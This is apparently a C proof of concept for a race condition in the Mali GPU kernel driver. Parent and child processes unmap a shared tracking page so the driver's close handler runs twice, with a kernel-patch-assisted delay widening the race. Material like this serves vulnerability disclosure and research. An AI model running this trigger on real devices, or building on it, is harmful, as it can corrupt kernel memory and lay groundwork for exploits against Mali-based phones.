#define _GNU_SOURCE
#include <fcntl.h>
#include <err.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

#define KBASE_IOCTL_TYPE 0x80

#define __u8  uint8_t
#define __u16 uint16_t
#define __u32 uint32_t
#define __u64 uint64_t

struct kbase_ioctl_version_check {
        __u16 major;
        __u16 minor;
};
#define KBASE_IOCTL_VERSION_CHECK \
        _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)

struct kbase_ioctl_set_flags {
        __u32 create_flags;
};
#define KBASE_IOCTL_SET_FLAGS \
        _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)

#define LOCAL_PAGE_SHIFT 12
#define BASE_MEM_MAP_TRACKING_HANDLE (3ul << LOCAL_PAGE_SHIFT)

int main(void) {
  int mali_fd = SYSCHK(open("/dev/mali0", O_RDWR));

  struct kbase_ioctl_version_check vc = {
    .major = 11,
    .minor = 11
  };
  SYSCHK(ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc));
  struct kbase_ioctl_set_flags set_flags = { .create_flags = 0 };
  SYSCHK(ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags));

  /* will not be copied to child, mali sets VM_DONTCOPY */
  void *parent_tracking_page = SYSCHK(mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED,
        mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));

  /* causes split and close handler invocation */
  SYSCHK(munmap(parent_tracking_page+0x1000, 0x1000));

  SYSCHK(signal(SIGCHLD, SIG_IGN));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_NAME, "CHILD"));
    void *child_tracking_page = SYSCHK(mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED,
          mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
    sleep(2);
    /* invoke close handler, inner side of race */
    SYSCHK(munmap(child_tracking_page, 0x1000));
    /* free mm */
    exit(0);
  }

  sleep(1);
  SYSCHK(prctl(PR_SET_NAME, "SLOWME"));
  /* invoke close handler, outer side of race */
  SYSCHK(munmap(parent_tracking_page, 0x1000)); /* KERNEL-PATCH-ASSISTED DELAY 5 SECONDS */
  SYSCHK(prctl(PR_SET_NAME, "PARENT"));
}
